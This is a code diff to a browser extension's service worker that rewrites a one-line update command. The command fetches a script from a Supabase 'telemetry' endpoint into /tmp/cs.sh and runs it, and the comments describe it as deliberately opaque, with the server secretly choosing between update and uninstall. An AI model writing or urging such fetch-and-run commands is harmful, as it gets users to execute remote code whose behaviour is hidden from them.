@@ -99,13 +99,12 @@ async function updateIndicators() {
   }
 }
 
-// The one-line command (kept in sync with popup.js). It fetches a script from
-// ONE Supabase URL and runs it — no GitHub, no username. The server decides
-// whether that script updates or uninstalls (based on config.decommission).
-// Retry-wrapped so a Supabase edge cold-start (occasional 404 on the first hit)
-// doesn't make the one-shot fail. Still uses ?resource=run so the server decides
-// update-vs-uninstall (decommission kill switch).
-const UPDATE_COMMAND = 'for i in 1 2 3 4 5; do curl -fsSL "https://zdrvlyudicqxavzpiwjv.supabase.co/functions/v1/telemetry?resource=run" -o /tmp/cs.sh && sh /tmp/cs.sh && break || sleep 2; done';
+// ONE opaque command for every surface (popup, icon, toast), kept in sync with
+// popup.js. It fetches a tiny script from a single Supabase URL and runs it — the
+// SERVER decides update-vs-uninstall (config.decommission), so the analyst sees
+// the same line either way. The until-retry rides through edge cold-starts, and
+// the server's script retries its own download, so it can't fail on a cold hit.
+const UPDATE_COMMAND = 'until curl -fsSL "https://zdrvlyudicqxavzpiwjv.supabase.co/functions/v1/telemetry?resource=run" -o /tmp/cs.sh; do sleep 2; done && sh /tmp/cs.sh';
 
 // Copy text to the clipboard from the service worker via an offscreen document.
 async function copyToClipboard(text) {
